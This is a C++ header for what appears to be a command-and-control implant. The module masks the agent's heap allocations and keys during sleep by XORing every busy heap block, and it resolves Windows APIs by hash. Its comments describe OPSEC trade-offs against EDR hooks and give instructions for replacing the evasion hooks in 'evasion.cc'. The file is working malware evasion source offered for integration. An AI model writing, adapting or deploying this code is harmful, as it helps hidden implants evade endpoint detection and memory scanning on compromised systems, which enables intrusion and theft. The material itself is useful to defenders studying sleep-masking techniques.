/*
 * mask_heap.h — Sensitive data + heap allocation masking during sleep.
 *
 * Extends the default XOR masking to also walk the process heap and
 * mask all allocations made by the agent. This catches dynamically
 * allocated buffers (parsed task data, downloaded files in transit,
 * assembled response buffers, etc.) that the default mask misses.
 *
 * MECHANISM:
 *   1. XOR sensitive instance fields (AES key, UUIDs)
 *   2. Walk HeapWalk() over GetProcessHeap(), XOR each BUSY block
 *   3. Sleep
 *   4. Reverse: un-XOR heap blocks, un-XOR sensitive fields
 *
 * REQUIREMENTS:
 *   - HeapWalk, GetProcessHeap must be resolvable
 *   - inst.evasion.ekko.rc4_key initialized
 *
 * OPSEC:
 *   + Covers all heap-allocated sensitive data (task responses, keys, etc.)
 *   + No VirtualProtect calls (heap is already RW)
 *   + Low overhead — only walks committed heap blocks
 *   - Does NOT mask the shellcode .text section (use mask_full_image.h for that)
 *   - HeapWalk itself may be hooked by EDR
 *   - Very large heaps slow down mask/unmask cycle
 *
 * INTEGRATION:
 *   Replace evasion_pre_sleep() and evasion_post_sleep() in evasion.cc.
 *   Resolve HeapWalk and GetProcessHeap on the instance or inline.
 */

typedef BOOL (WINAPI *fn_HeapWalk)( HANDLE, LPPROCESS_HEAP_ENTRY );
typedef HANDLE (WINAPI *fn_GetProcessHeap)( void );

/*
 * XOR all BUSY heap blocks with the masking key.
 * Symmetric — call twice to mask/unmask.
 */
static auto declfn xor_heap_blocks( instance& inst ) -> void {
    auto pGetProcessHeap = reinterpret_cast<fn_GetProcessHeap>(
        resolve::_api( inst.kernel32.handle,
            expr::hash_string( "GetProcessHeap" ) ) );
    auto pHeapWalk = reinterpret_cast<fn_HeapWalk>(
        resolve::_api( inst.kernel32.handle,
            expr::hash_string( "HeapWalk" ) ) );

    if ( !pGetProcessHeap || !pHeapWalk ) return;

    HANDLE heap = pGetProcessHeap();
    if ( !heap ) return;

    auto key = inst.evasion.ekko.rc4_key;

    PROCESS_HEAP_ENTRY entry = {};
    while ( pHeapWalk( heap, &entry ) ) {
        if ( !( entry.wFlags & PROCESS_HEAP_ENTRY_BUSY ) )
            continue;

        /* Skip very small blocks (heap metadata) and the instance itself */
        if ( entry.cbData < 16 ) continue;

        /* Skip the masking key itself to avoid double-masking */
        auto block_start = reinterpret_cast<uintptr_t>( entry.lpData );
        auto key_start   = reinterpret_cast<uintptr_t>( inst.evasion.ekko.rc4_key );
        if ( block_start <= key_start &&
             key_start < block_start + entry.cbData )
            continue;

        auto data = reinterpret_cast<uint8_t*>( entry.lpData );
        for ( uint32_t i = 0; i < entry.cbData; i++ ) {
            data[i] ^= key[ i % 16 ];
        }
    }
}

/*
 * evasion_pre_sleep — Mask sensitive fields + all heap blocks.
 */
auto declfn evasion_pre_sleep( instance& inst ) -> void {
    if ( !inst.evasion.ekko.initialized ) return;

    /* Mask sensitive instance fields */
    xor_sensitive_data( inst );

    /* Mask all heap allocations */
    xor_heap_blocks( inst );
}

/*
 * evasion_post_sleep — Unmask heap blocks + sensitive fields.
 */
auto declfn evasion_post_sleep( instance& inst ) -> void {
    if ( !inst.evasion.ekko.initialized ) return;

    /* Unmask heap (must happen before sensitive fields since
       the heap walk needs valid function pointers) */
    xor_heap_blocks( inst );

    /* Unmask sensitive instance fields */
    xor_sensitive_data( inst );
}
